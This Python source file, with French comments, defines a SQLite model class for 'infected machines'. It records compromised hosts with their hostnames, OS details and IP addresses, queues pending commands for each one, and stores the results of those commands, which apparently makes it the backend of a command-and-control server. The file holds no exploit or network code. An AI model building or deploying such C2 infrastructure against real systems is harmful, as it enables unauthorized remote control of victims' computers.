from database import get_db


class Machine:
    """Représente une machine infectée. Gère les opérations CRUD dans SQLite."""

    @staticmethod
    def create(hostname, os_info, private_ip=None, public_ip=None):
        """Insère une nouvelle machine et retourne son ID."""
        db = get_db()
        cursor = db.execute(
            'INSERT INTO machines (hostname, os_info, private_ip, public_ip) VALUES (?, ?, ?, ?)',
            (hostname, os_info, private_ip, public_ip)
        )
        machine_id = cursor.lastrowid
        db.commit()
        db.close()
        return machine_id

    @staticmethod
    def get_all():
        """Retourne toutes les machines, triées par date de dernier contact."""
        db = get_db()
        rows = db.execute('SELECT * FROM machines ORDER BY last_seen DESC').fetchall()
        db.close()
        return [dict(row) for row in rows]

    @staticmethod
    def get_by_id(machine_id):
        """Retourne une machine par son ID. Retourne None si elle n'existe pas."""
        db = get_db()
        row = db.execute('SELECT * FROM machines WHERE id = ?', (machine_id,)).fetchone()
        db.close()
        return dict(row) if row else None

    @staticmethod
    def set_command(machine_id, command):
        """Enregistre une commande en attente et efface le résultat précédent."""
        db = get_db()
        db.execute(
            'UPDATE machines SET pending_command = ?, command_result = NULL WHERE id = ?',
            (command, machine_id)
        )
        db.commit()
        db.close()

    @staticmethod
    def get_command(machine_id):
        """Lit la commande en attente."""
        db = get_db()
        row = db.execute('SELECT pending_command FROM machines WHERE id = ?', (machine_id,)).fetchone()
        db.close()
        return row['pending_command'] if row else None

    @staticmethod
    def set_result(machine_id, result):
        """Enregistre le résultat et efface la commande en attente."""
        db = get_db()
        db.execute(
            'UPDATE machines SET command_result = ?, pending_command = NULL WHERE id = ?',
            (result, machine_id)
        )
        db.commit()
        db.close()

    @staticmethod
    def get_result(machine_id):
        """Retourne le résultat de la dernière commande."""
        db = get_db()
        row = db.execute('SELECT command_result FROM machines WHERE id = ?', (machine_id,)).fetchone()
        db.close()
        return row['command_result'] if row else None
